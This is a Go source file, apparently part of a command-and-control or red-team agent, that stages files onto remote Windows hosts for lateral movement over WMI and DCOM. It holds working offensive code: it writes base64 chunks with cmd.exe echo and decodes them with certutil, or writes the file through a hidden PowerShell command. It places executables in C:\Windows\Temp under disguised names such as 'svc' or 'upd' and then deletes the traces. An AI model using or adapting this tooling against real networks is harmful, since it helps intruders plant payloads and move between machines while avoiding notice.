// lateral_staging.go provides shared file staging utilities for lateral
// movement commands (WMI, DCOM). Implements certutil and PowerShell staging
// methods to transfer files to remote hosts via command execution.
// Cross-platform: staging plan generation is pure Go, execution is Windows-only.

package commands

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
)

// stagingMethod defines how a file is reconstructed on the remote host.
type stagingMethod int

const (
	stageCertutil   stagingMethod = iota // certutil -decode from base64 chunks
	stagePowerShell                      // PowerShell [IO.File]::WriteAllBytes
)

// stagingPlan holds the sequence of commands needed to stage a file remotely.
type stagingPlan struct {
	// Commands to execute in order to write the file
	WriteCommands []string
	// Command to decode/finalize the file (certutil method only)
	DecodeCommand string
	// Final path of the staged file on the remote host
	RemotePath string
	// Cleanup commands to remove staging artifacts
	CleanupCommands []string
}

// maxCmdLen is the safe command length for cmd.exe (8191 limit, leave margin).
const maxCmdLen = 7000

// maxPSBase64 is the max base64 size for a single PowerShell command.
// PowerShell command lines can be longer but we stay conservative.
const maxPSBase64 = 200000 // ~150KB decoded

// planStaging creates a staging plan for transferring a local file to a remote host.
// localPath is the path to read the file from (on the agent's filesystem).
// remotePath is the desired destination on the remote host. If empty, a random
// path under C:\Windows\Temp is generated.
// method selects the staging approach (certutil or PowerShell).
func planStaging(localPath, remotePath string, method stagingMethod) (*stagingPlan, error) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return nil, fmt.Errorf("cannot read local file: %w", err)
	}

	if len(data) == 0 {
		return nil, fmt.Errorf("local file is empty")
	}

	if remotePath == "" {
		ext := filepath.Ext(localPath)
		if ext == "" {
			ext = ".exe"
		}
		remotePath = fmt.Sprintf(`C:\Windows\Temp\%s%s`, randomStagingName(), ext)
	}

	switch method {
	case stagePowerShell:
		return planPowerShellStaging(data, remotePath)
	default:
		return planCertutilStaging(data, remotePath)
	}
}

// planCertutilStaging creates commands to write base64 chunks via echo,
// then decode with certutil.
func planCertutilStaging(data []byte, remotePath string) (*stagingPlan, error) {
	b64 := base64.StdEncoding.EncodeToString(data)
	b64Path := remotePath + ".b64"

	plan := &stagingPlan{
		RemotePath: remotePath,
	}

	// Split base64 into chunks that fit within cmd.exe limits.
	// Each command: cmd.exe /c echo <chunk> >> "path"
	// Overhead: ~50 chars for the echo/redirect wrapper
	chunkSize := maxCmdLen - len(b64Path) - 60

	// First chunk uses > (overwrite), rest use >> (append)
	for i := 0; i < len(b64); i += chunkSize {
		end := i + chunkSize
		if end > len(b64) {
			end = len(b64)
		}
		chunk := b64[i:end]

		redirect := ">>"
		if i == 0 {
			redirect = ">"
		}
		cmd := fmt.Sprintf(`cmd.exe /c echo %s %s "%s"`, chunk, redirect, b64Path)
		plan.WriteCommands = append(plan.WriteCommands, cmd)
	}

	// Decode base64 to binary
	plan.DecodeCommand = fmt.Sprintf(`cmd.exe /c certutil -decode "%s" "%s"`, b64Path, remotePath)

	// Cleanup: remove both the b64 staging file and the final binary
	plan.CleanupCommands = []string{
		fmt.Sprintf(`cmd.exe /c del /f /q "%s"`, b64Path),
		fmt.Sprintf(`cmd.exe /c del /f /q "%s"`, remotePath),
	}

	return plan, nil
}

// planPowerShellStaging creates a single PowerShell command to write the file.
// Only suitable for smaller files (< ~150KB).
func planPowerShellStaging(data []byte, remotePath string) (*stagingPlan, error) {
	b64 := base64.StdEncoding.EncodeToString(data)

	if len(b64) > maxPSBase64 {
		// Fall back to certutil for large files
		return planCertutilStaging(data, remotePath)
	}

	plan := &stagingPlan{
		RemotePath: remotePath,
	}

	// Single PowerShell command to decode and write
	psCmd := fmt.Sprintf(
		`powershell.exe -NoP -NonI -W Hidden -C "[IO.File]::WriteAllBytes('%s',[Convert]::FromBase64String('%s'))"`,
		strings.ReplaceAll(remotePath, `'`, `''`),
		b64,
	)
	plan.WriteCommands = []string{psCmd}

	plan.CleanupCommands = []string{
		fmt.Sprintf(`cmd.exe /c del /f /q "%s"`, remotePath),
	}

	return plan, nil
}

// randomStagingName generates a plausible-looking staging filename.
func randomStagingName() string {
	prefixes := []string{
		"svc", "tmp", "upd", "sys", "cfg", "win", "mst", "dsc",
	}
	prefix := prefixes[rand.Intn(len(prefixes))]
	suffix := fmt.Sprintf("%04x", rand.Intn(0xFFFF))
	return prefix + suffix
}

// parseStagingMethod converts a string to a stagingMethod.
func parseStagingMethod(s string) stagingMethod {
	switch strings.ToLower(s) {
	case "powershell", "ps":
		return stagePowerShell
	default:
		return stageCertutil
	}
}
